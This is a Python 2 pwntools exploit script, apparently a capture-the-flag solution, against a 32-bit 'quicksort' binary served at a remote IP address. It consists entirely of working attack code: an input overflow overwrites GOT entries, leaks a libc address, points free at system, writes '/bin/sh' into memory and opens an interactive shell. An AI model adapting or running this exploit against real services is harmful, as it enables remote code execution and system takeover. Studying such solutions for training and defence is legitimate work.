from pwn import *
context.log_level = 'debug'
p = process("./quicksort",env={"LD_PRELOAD":"./libc.so.6"})
elf = ELF("./libc.so.6")

p = remote("34.92.96.238",10000)

free_got = 0x0804A018
malloc_got = 0x804A028
puts_got = 0x804A02C
main = 0x08048816

#one_gadget = 0x5fbc6

def Input_num(num):
	p.recvuntil("number:")
	p.send(num)
if __name__=='__main__':
	
	p.recvuntil("how many numbers do you want to sort?")
	p.sendline("3")
	Input_num(str(main)+'A'*(16-len(str(main)))+p32(3)+p32(0)+p32(0)+p32(free_got)+'\n')

	Input_num('9'*0x10+p32(1)+p32(12)+p32(0)+p32(malloc_got)+'\n')
	p.recvuntil("result:\n")
	leak_addr = long(p.recv(10))
	addr = leak_addr+2**31+0x80000000
	libc_addr = addr - elf.symbols['malloc'] 
	print "libc_addr:",hex(libc_addr)
	
	p.recvuntil("how many numbers do you want to sort?")
	p.sendline("3")

	binsh = list(elf.search("/bin/sh"))[0] + libc_addr
	
	system_addr = libc_addr + elf.symbols['system'] - 0x100000000	

	Input_num(str(system_addr)+'A'*(16-len(str(system_addr)))+p32(2)+p32(0)+p32(0)+p32(free_got)+'\n')
	
	Input_num(str(0x6e69622f)+'A'*(16-len(str(0x6e69622f)))+p32(2)+p32(0)+p32(0)+p32(0x804A020)+'\n')
	#gdb.attach(p)	
	Input_num(str(0x0068732f)+'A'*(16-len(str(0x0068732f)))+p32(0)+p32(1)+p32(0)+p32(0x804A020)+'\n')
	#------------/bin/sh/的字符串
	p.interactive()
